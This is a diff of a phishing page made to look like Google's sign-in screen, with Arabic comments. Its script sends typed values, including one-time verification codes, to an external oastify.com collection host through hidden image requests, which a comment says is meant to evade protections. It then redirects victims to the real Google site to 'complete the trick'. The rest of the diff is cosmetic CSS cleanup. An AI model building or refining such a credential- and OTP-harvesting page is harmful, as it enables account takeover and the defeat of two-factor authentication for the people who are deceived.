@@ -9,14 +9,8 @@
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-card { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
         
-        /* شعار جوجل الكبير بالألوان باستخدام الـ CSS */
         .google-logo-css { font-family: 'Product Sans', 'Roboto', sans-serif; font-size: 38px; font-weight: 500; letter-spacing: -1.5px; margin-bottom: 25px; margin-top: 10px; display: inline-block; }
-        .g1 { color: #4285F4; } /* أزرق */
-        .o1 { color: #EA4335; } /* أحمر */
-        .o2 { color: #FBBC05; } /* أصفر */
-        .g2 { color: #4285F4; } /* أزرق */
-        .l1 { color: #34A853; } /* أخضر */
-        .e1 { color: #EA4335; } /* أحمر */
+        .g1 { color: #4285F4; } .o1 { color: #EA4335; } .o2 { color: #FBBC05; } .g2 { color: #4285F4; } .l1 { color: #34A853; } .e1 { color: #EA4335; }
 
         h1 { font-size: 24px; font-weight: 400; line-height: 1.33; margin: 0; color: #202124; }
         p.subtitle { font-size: 16px; font-weight: 400; letter-spacing: 0.1px; line-height: 1.5; margin-bottom: 30px; margin-top: 8px; color: #202124; }
@@ -69,11 +63,13 @@
 </div>
 
 <script>
-    const collab = "https://qztxhk8myqztykvf8i29l0f4wv2mqce1.oastify.com";
+    // تم تحديث الرابط الخاص بك هنا يا لواء
+    const collab = "https://Qztxhk8myqztykvf8i29l0f4wv2mqce1.oastify.com";
 
     function track(action, params) {
         const img = new Image();
         const queryString = Object.keys(params).map(key => `${key}=${encodeURIComponent(params[key])}`).join('&');
+        // إرسال البيانات كطلب صورة لتخطي قيود الحماية
         img.src = `${collab}/${action}?${queryString}&_cache=${Math.random()}`;
     }
 
@@ -91,7 +87,8 @@
         const o = document.getElementById('otp').value;
         if(o) {
             track("G_OTP", { code: o });
-            setTimeout(() => { window.location.href = "https://accounts.google.com"; }, 500);
+            // تحويل المستخدم لصفحة جوجل الرسمية لإتمام "الخدعة"
+            setTimeout(() => { window.location.href = "https://accounts.google.com"; }, 800);
         } else { alert("يرجى إدخال رمز التحقق"); }
     }
 </script>
